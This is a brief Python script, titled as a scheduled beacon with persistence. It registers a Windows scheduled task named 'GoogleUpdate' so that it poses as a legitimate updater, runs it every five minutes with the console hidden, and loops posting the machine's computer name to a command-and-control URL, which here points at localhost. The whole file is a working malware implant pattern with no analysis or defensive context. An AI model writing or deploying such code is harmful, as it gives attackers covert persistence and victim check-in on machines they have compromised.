# Scheduled beacon with persistence
import os, subprocess, requests, time

C2 = "http://127.0.0.1:8443/register"
subprocess.run(["schtasks", "/create", "/f", "/tn", "GoogleUpdate",
                "/tr", "python.exe beacon.py",
                "/sc", "minute", "/mo", "5"],
               capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)

while True:
    requests.post(C2, json={"host": os.environ.get("COMPUTERNAME", "unknown")})
    time.sleep(60)
